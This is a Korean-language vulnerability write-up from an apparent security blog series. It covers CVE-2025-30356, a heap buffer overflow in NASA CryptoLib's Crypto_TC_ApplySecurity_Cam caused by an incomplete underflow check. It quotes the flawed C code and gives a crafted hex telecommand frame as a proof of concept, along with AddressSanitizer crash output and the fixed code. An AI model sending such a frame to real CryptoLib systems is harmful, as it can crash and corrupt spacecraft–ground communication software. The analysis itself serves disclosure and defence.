---
title: "[하루한줄] CVE-2025-30356: NASA CryptoLib의 길이 검증 미흡으로 인한 Heap Buffer Overflow"
author: OUYA77
tags: [CryptoLib, Heap_buffer_overflow, Nasa, cFS, OUYA77]
categories: [1day1line]
date: 2025-10-22 18:00:00
cc: true
index_img: /img/1day1line.png
---

지난 NASA SW 취약점

> [[하루한줄] CVE-2025-54878: NASA CryptoLib의 Heap Buffer Overflow로 인한 서비스 거부(DoS)](https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/) 
[[하루한줄] CVE-2024-55030 : NASA fPrime의 Queue Overflow로 인한 DoS 취약점](https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/)
[[하루한줄] CVE-2025-25372: cFS 메모리 관리 모듈의 부적절한 메모리 접근 검증으로 인한 서비스 거부 취약점](https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/)
[[하루한줄] CVE-2025-30216: CryptoLib의 Heap Buffer Overflow 취약점](https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/)
> 

## URL

[https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2](https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2)

## Target

- NASA CryptoLib ≤ 1.3.3

## Explain

### 0. 취약점 배경

NASA CryptoLib은 cFS(core Flight System)를 실행하는 우주선과 지상국 간의 통신을 보호하기 위해 CCSDS(Consultative Committee for Space Data Systems) Space Data Link Security Protocol - Extended Procedures (SDLS-EP)를 사용하는 소프트웨어 기반 솔루션입니다. 이 라이브러리는 텔레커맨드 프레임 처리 로직에 Heap Buffer Overflow 취약점이 있습니다. 

### 1. Root Cause 설명

`Crypto_TC_ApplySecurity` 함수는 암호화 및 보안 관련 라이브러리에서 사용되는 것으로 보이며, 통신 프레임에 대한 보안 처리를 담당합니다. 이 함수는 프레임의 헤더와 페이로드 길이를 계산하고, 데이터를 복사하는 과정에서 취약한 부분을 가지고 있습니다

취약점은 `Crypto_TC_ApplySecurity_Cam()` 함수 내에서 발생합니다. 이전의 보안 권고에서 `fl` 필드의 언더플로우 문제를 해결하려고 시도했지만, 패치 코드가 불완전하여 여전히 안전하지 않은 계산이 가능합니다.

**문제 코드:**

```c
if (temp_tc_header.fl <= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1)
{
    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;
    mc_if->mc_log(status);
    return status;
} 

uint16_t tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;
memcpy((p_new_enc_frame + index), (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len), tf_payload_len);
```

현재의 패치 코드는 `fl`이 특정 상수값보다 작거나 같은지 확인하지만, 이는 `tf_payload_len` 계산에서 발생하는 언더플로우를 완전히 막지 못합니다. 예를 들어, 공격자가 `fl`을 `6`, `segment_hdr_len`을 `1`, `fecf_len`을 `2`로 조작하면, `tf_payload_len` 계산 결과는 `-1`이 됩니다. 이 값은 `uint16_t` 자료형으로 캐스팅되면서 `65535`와 같은 매우 큰 양수 값으로 변환(integer wrap-around)됩니다.

결과적으로, `memcpy()` 함수는 `tf_payload_len`이 `65535`라는 거대한 값을 갖게 되므로, 할당된 힙 메모리 범위를 훨씬 초과하여 데이터를 복사하게 됩니다. 이로 인해 힙 메모리 영역이 손상됩니다.

### 2. PoC 설명

ASan(AddressSanitizer)이 활성화된 상태에서 다음과 같이 조작된 최소한의 입력 프레임을 `Crypto_TC_ApplySecurity()` 함수에 전달하면, 패치를 우회하여 충돌을 유발할 수 있습니다.

조작된 입력 프레임:

```jsx
20 03 00 06 19 31 FA 2A 79 20 6F 7F 0D AD 55 CE 54 89 9D D3 7F A6 D0 07 B4 E8 6D B4 E8 6D A4 B4 E8 67
```

이 프레임을 실행하면, ASan은 다음과 같은 오류를 출력하며 힙 버퍼 오버플로우를 탐지합니다.

```
READ of size 65535 at 0x... thread T0
#0 in __asan_memcpy
#1 in Crypto_TC_ApplySecurity_Cam (crypto_tc.c:1161)
...
SUMMARY: AddressSanitizer: heap-buffer-overflow
```

또한, GDB로 실행 시 힙 손상으로 인한 프로그램 중단(Abort)을 확인할 수 있습니다.

```
----- Crypto_TC_ApplySecurity END -----
malloc(): corrupted top size
Program received signal SIGABRT, Aborted.

```

- **영향을 받는 커밋:** `01b7402cf07c3ee0ddf422de7c20a3d87fff8a87`

### 3. Patch Diffing

Underflow 검사를 위해 길이가 0보다 작으면 함수를 종료하는 검증문을 추가하는 식으로 패치가 되었습니다.

```jsx
int16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + 1;
if (payload_calc < 0)
{
#ifdef TC_DEBUG
    printf("Payload Calculation Underflow: %d\n", payload_calc);
#endif
    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;
    mc_if->mc_log(status);
    return status;
}
tf_payload_len = (uint16_t)payload_calc;
```

### ref

[https://nvd.nist.gov/vuln/detail/cve-2025-30356](https://nvd.nist.gov/vuln/detail/cve-2025-30356)